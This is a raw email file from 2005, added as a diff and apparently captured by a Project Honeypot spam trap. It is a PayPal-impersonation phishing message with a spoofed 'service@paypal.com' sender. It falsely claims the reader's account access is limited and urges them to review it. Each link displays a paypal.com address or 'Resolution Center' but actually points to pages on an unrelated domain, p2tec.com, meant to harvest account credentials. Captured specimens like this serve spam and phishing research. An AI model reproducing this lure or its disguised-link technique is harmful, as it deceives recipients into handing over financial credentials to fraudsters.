@@ -1,0 +1,44 @@
+Received: from server1.olicentral.com (216.121.191.6)
+  by projecthoneypotmailserver with SMTP; 7 Jul 2005 06:36:51 -0000
+Received: (from nobody@localhost)
+	by server1.olicentral.com (8.11.7/8.11.7) id j676aaY20408;
+	Wed, 6 Jul 2005 23:36:36 -0700
+Date: Wed, 6 Jul 2005 23:36:36 -0700
+Message-Id: <200507070636.j676aaY20408@server1.olicentral.com>
+To: projecthoneypot@projecthoneypot.org
+Subject: Limited access to sensitive PayPal account features
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: "service@paypal.com" <service@paypal.com>
+
+
+
+<HTML>
+<HEAD>
+<META NAME="GENERATOR" Content="Microsoft DHTML Editing Control">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<P><BR><FONT face="MS Sans Serif">As part of our security measures, we regularly 
+screen activity in the<BR>PayPal system. We recently noticed the following issue 
+on your account:<BR><BR>We would like to ensure that your account was not 
+accessed by an<BR>unauthorized third party. Because protecting the security of 
+your <BR>account is our primary concern, we have limited access to sensitive 
+PayPal <BR>account features. We know that this may be an inconvenience but 
+please<BR>understand that this temporary limitation is for your 
+protection.<BR>Case ID Number: PP-072-838-482</FONT> </P>
+<P><A href="http://www.p2tec.com/java/index.htm" target=_blank><FONT face="MS Sans Serif" 
+color=#003399>https://www.paypal.com/us/cgi-bin/webscr?cmd=view-limitation</FONT></A></P>
+<BR>To review your account and some or all of the information that PayPal <BR>used to make its 
+decision to limit your account access, please visit the<BR>
+</FONT><A href="http://www.p2tec.com/java/index.htm" target=_blank><FONT face="MS Sans Serif" 
+color=#003399>Resolution Center</FONT></A><FONT face="MS Sans Serif"> or copy this link and paste it in the Internet Explorer bar <BR> </FONT><A href="http://www.p2tec.com/java/primapagina.html" target=_blank><FONT face="MS Sans Serif" 
+color=#003399>http://www.paypal.com</FONT></A><FONT face="MS Sans Serif"> . If after reviewing your account information, you<BR> seek further clarification 
+regarding your account access, please contact PayPal<BR> by visiting the Help Center and clicking "Contact Us". We thank you for <BR>your prompt attention to 
+this matter. Please understand <BR> that this is a security measure intended to 
+help you and protect your account.<BR> We apologize for any 
+inconvenience.<BR><BR>Sincerely,<BR>PayPal Account Review 
+Department<BR><BR>PayPal Email ID PP522</FONT></P>
+</BODY>
+</HTML>
+
